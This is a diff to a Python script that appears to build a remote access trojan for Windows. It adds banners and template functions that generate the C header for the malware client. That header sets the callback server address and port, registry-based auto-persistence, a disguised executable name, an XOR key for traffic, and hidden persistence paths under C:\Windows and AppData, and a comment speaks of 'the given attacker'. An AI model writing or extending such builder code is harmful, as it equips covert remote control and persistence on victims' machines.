@@ -79,6 +79,117 @@ def printColor(status,message):
     elif status == "successfully":
         print(SUCCESSFULLY_COLOR+message+TERMINAL_COLOR)
 
+
+def myBanner():
+    return """
+ ███████████     █████████   ███████████                     ████      █████████                                                   
+░░███░░░░░███   ███░░░░░███ ░█░░░███░░░█                    ░░███     ███░░░░░███                                                  
+ ░███    ░███  ░███    ░███ ░   ░███  ░              ██████  ░███    ░███    ░░░   ██████  ████████  █████ █████  ██████  ████████ 
+ ░██████████   ░███████████     ░███     ██████████ ███░░███ ░███    ░░█████████  ███░░███░░███░░███░░███ ░░███  ███░░███░░███░░███
+ ░███░░░░░███  ░███░░░░░███     ░███    ░░░░░░░░░░ ░███████  ░███     ░░░░░░░░███░███████  ░███ ░░░  ░███  ░███ ░███████  ░███ ░░░ 
+ ░███    ░███  ░███    ░███     ░███               ░███░░░   ░███     ███    ░███░███░░░   ░███      ░░███ ███  ░███░░░   ░███     
+ █████   █████ █████   █████    █████              ░░██████  █████   ░░█████████ ░░██████  █████      ░░█████   ░░██████  █████    
+░░░░░   ░░░░░ ░░░░░   ░░░░░    ░░░░░                ░░░░░░  ░░░░░     ░░░░░░░░░   ░░░░░░  ░░░░░        ░░░░░     ░░░░░░  ░░░░░   BETA                                                                                                                                                                                                                                                                                                                
+"""
+
+
+def bannerCisco():
+    return """
+ █████                             ███                           
+░░███                             ░░░                            
+ ░███████  █████ ████     ██████  ████   █████   ██████   ██████ 
+ ░███░░███░░███ ░███     ███░░███░░███  ███░░   ███░░███ ███░░███
+ ░███ ░███ ░███ ░███    ░███ ░░░  ░███ ░░█████ ░███ ░░░ ░███ ░███
+ ░███ ░███ ░███ ░███    ░███  ███ ░███  ░░░░███░███  ███░███ ░███
+ ████████  ░░███████    ░░██████  █████ ██████ ░░██████ ░░██████ 
+░░░░░░░░    ░░░░░███     ░░░░░░  ░░░░░ ░░░░░░   ░░░░░░   ░░░░░░  
+            ███ ░███                                             
+           ░░██████                                              
+            ░░░░░░                                               
+"""                             
+
+
+def commonHeader():
+    header = """
+#ifndef COMMON_H
+#define COMMON_H
+//default header
+#define BUFFER_LEN 4096
+
+//Change everything according to your wishes:
+#define IP_ADDRESS "192.168.0.98" //Ip of server
+#define PORT 8888 //Port of server
+#define AUTO_PERSISTENCE false
+#define TIMEOUT 3000//Seconds for reconnect to server during a disconnection
+#define NAME_PROG "12.exe" //Name of prog
+#define NAME_KEY_REGISTER  "win64" 
+#define XOR_KEY "123456789" //The key to encrypt and decrypt data using the XOR algorithm
+
+#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
+#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
+#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH
+
+//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
+// DO NOT TOUCH:
+
+#define TIMEOUT_CREATE_PROC  10000
+#define BUFFER_LEN 4096
+#define TIMEOUT_SOCK 5 
+#define SLEEP_RECV 200 
+#define TIMEOUT_POPEN 5000 
+#define MICRO_SLEEP 100 //micro sleep for timeout
+#define SPLIT "|SPLIT|" 
+
+
+#endif
+
+/*
+$USER is changed by the user who executed the program.
+*/
+"""
+    return header
+
+def customHeader(ip, auto, port, reco, name, registry, key): 
+    #In order not to have an error you need 4 \.
+    #Example C:\ = C:\\\\
+    header = """
+#ifndef COMMON_H
+#define COMMON_H
+
+#define BUFFER_LEN 4096
+
+//Change everything according to your wishes:
+#define IP_ADDRESS "{}" //Ip of server
+#define PORT {} //Port of server
+#define AUTO_PERSISTENCE {}
+#define TIMEOUT {} // Seconds for reconnect to server during a disconnection
+#define NAME_PROG "{}" //Name of prog
+#define NAME_KEY_REGISTER  "{}" 
+#define XOR_KEY "{}" //The key to encrypt and decrypt data using the XOR algorithm
+
+#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
+#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
+#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH
+
+//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
+// DO NOT TOUCH:
+
+#define TIMEOUT_CREATE_PROC  10000
+#define BUFFER_LEN 4096
+#define TIMEOUT_SOCK 5 
+#define SLEEP_RECV 200
+#define MICRO_SLEEP 100 //micro sleep for timeout
+#define SPLIT "|SPLIT|" 
+
+
+#endif
+
+""".format(ip, port, auto, reco, name, registry,key)
+
+    return header
+
+
+'''
 def myBanner():
     myvar = """
                          .:--=======-:.                         
@@ -120,86 +231,4 @@ def myBanner():
                                     ...::                       /_/ |_/_/  |_/_/      \___/_/   /____/\___/_/    |___/\___/_/
 """
     return myvar
-
-
-def commonHeader():
-    header = """
-#ifndef COMMON_H
-#define COMMON_H
-//default header
-#define BUFFER_LEN 4096
-
-//Change everything according to your wishes:
-#define IP_ADDRESS "192.168.0.98" //Ip of server
-#define PORT 8888 //Port of server
-#define AUTO_PERSISTENCE false
-#define TIMEOUT 3000//Seconds for reconnect to server during a disconnection
-#define NAME_PROG "12.exe" //Name of prog
-#define NAME_KEY_REGISTER  "win64" 
-#define XOR_KEY "123456789" //The key to encrypt and decrypt data using the XOR algorithm
-
-#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
-#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
-#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH
-
-//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
-// DO NOT TOUCH:
-
-#define TIMEOUT_CREATE_PROC  10000
-#define BUFFER_LEN 4096
-#define TIMEOUT_SOCK 5 // DO NOT TOUCH 
-#define SLEEP_RECV 200 // DO NOT TOUCH 
-#define TIMEOUT_POPEN 5000 // DO NOT TOUCH
-#define MICRO_SLEEP 100 //micro sleep for timeout
-#define SPLIT "|SPLIT|" 
-
-
-#endif
-
-/*
-$USER is changed by the user who executed the program.
-*/
-"""
-    return header
-
-def customHeader(ip, auto, port, reco, name, registry, key): 
-    #In order not to have an error you need 4 \.
-    #Example C:\ = C:\\\\
-    header = """
-#ifndef COMMON_H
-#define COMMON_H
-
-#define BUFFER_LEN 4096
-
-//Change everything according to your wishes:
-#define IP_ADDRESS "{}" //Ip of server
-#define PORT {} //Port of server
-#define AUTO_PERSISTENCE {}
-#define TIMEOUT {} // Seconds for reconnect to server during a disconnection
-#define NAME_PROG "{}" //Name of prog
-#define NAME_KEY_REGISTER  "{}" 
-#define XOR_KEY "{}" //The key to encrypt and decrypt data using the XOR algorithm
-
-#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
-#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
-#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH
-
-//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
-// DO NOT TOUCH:
-
-#define TIMEOUT_CREATE_PROC  10000
-#define BUFFER_LEN 4096
-#define TIMEOUT_SOCK 5 // DO NOT TOUCH 
-#define SLEEP_RECV 200 // DO NOT TOUCH 
-#define TIMEOUT_POPEN 5000 // DO NOT TOUCH
-#define MICRO_SLEEP 100 //micro sleep for timeout
-#define SPLIT "|SPLIT|" 
-
-
-
-#endif
-
-""".format(ip, port, auto, reco, name, registry,key)
-
-    return header
-
+'''
